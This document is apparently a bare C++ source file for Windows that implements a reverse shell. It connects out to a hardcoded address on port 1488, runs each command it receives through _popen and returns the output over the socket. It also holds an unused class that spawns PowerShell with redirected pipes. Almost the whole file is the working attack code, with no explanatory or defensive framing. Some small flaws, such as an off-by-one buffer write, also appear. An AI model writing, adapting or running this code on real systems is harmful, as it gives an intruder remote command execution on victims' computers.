#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <process.h>


class Shell {
public:
    Shell() {
        SECURITY_ATTRIBUTES saAttr = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
        if (!CreatePipe(&hChildStdoutRd_, &hChildStdoutWr_, &saAttr, 0) ||
            !CreatePipe(&hChildStdinRd_, &hChildStdinWr_, &saAttr, 0)) {
            std::cerr << "CreatePipe failed" << std::endl;
            return;
        }

        STARTUPINFO si;
        PROCESS_INFORMATION pi;

        ZeroMemory(&si, sizeof(STARTUPINFO));
        ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

        si.cb = sizeof(STARTUPINFO);
        si.hStdError = hChildStdoutWr_;
        si.hStdOutput = hChildStdoutWr_;
        si.hStdInput = hChildStdinRd_;
        si.dwFlags |= STARTF_USESTDHANDLES;

        const char* args[] = {"powershell.exe", "-NoLogo", "-NoExit", "-File", "-", NULL};

        if (!CreateProcess(NULL, const_cast<char*>(args[0]), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            std::cerr << "Create Process failed" << std::endl;
            return;
        }

        CloseHandle(hChildStdoutWr_);
        CloseHandle(hChildStdinRd_);

        shellProcess_ = pi.hProcess;
        hChildStdinWr_ = hChildStdinWr_;
    }

    ~Shell() {
        TerminateProcess(shellProcess_, 0);
        CloseHandle(hChildStdinWr_);
    }

    HANDLE GetProcessHandle() const {
        return shellProcess_;
    }

    HANDLE GetInputHandle() const {
        return hChildStdinWr_;
    }

    HANDLE GetOutputHandle() const {
        return hChildStdoutRd_;
    }

private:
    HANDLE shellProcess_;
    HANDLE hChildStdinWr_;
    HANDLE hChildStdinRd_;
    HANDLE hChildStdoutWr_;
    HANDLE hChildStdoutRd_;
};

class ParentProcess {
public:
    ParentProcess(SOCKET socketfd, Shell& shell)
        : socketfd_(socketfd), shell_(shell) {}

    void handleCommands() {
        char buffer[1024] = {0};
        int n = 0;
        while ((n = recv(socketfd_, buffer, sizeof(buffer), 0)) > 0) {
            buffer[n] = '\0';
            FILE* fp = _popen(buffer, "r");
            if (fp == NULL) {
                perror("Error when executing the command");
            } else {
                char result[1024] = {0};
                while (fgets(result, sizeof(result) - 1, fp) != NULL) {
                    send(socketfd_, result, strlen(result), 0);
                }
                _pclose(fp);
            }
        }
        closesocket(socketfd_);
}

private:
    SOCKET socketfd_;
    Shell& shell_;
};

int main(int argc, char** argv) {
    const char* host = "192.168.125.131";
    unsigned short port = 1488;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Failed to initialize Winsock." << std::endl;
        return 1;
    }

    SOCKET clientSocket = INVALID_SOCKET;
    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Error when creating a socket: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }

    struct sockaddr_in servaddr = {0};
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(port);
    servaddr.sin_addr.s_addr = inet_addr(host);

    if (connect(clientSocket, (struct sockaddr*)&servaddr, sizeof(servaddr)) == SOCKET_ERROR) {
        std::cerr << "Error when establishing a connection with a socket: " << WSAGetLastError() << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

    Shell shell;

    if (shell.GetProcessHandle() == NULL) {
        std::cerr << "Error when creating a child process" << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    } else {
        ParentProcess parent(clientSocket, shell);
        parent.handleCommands();
    }

    closesocket(clientSocket);
    WSACleanup();

    return 0;
}
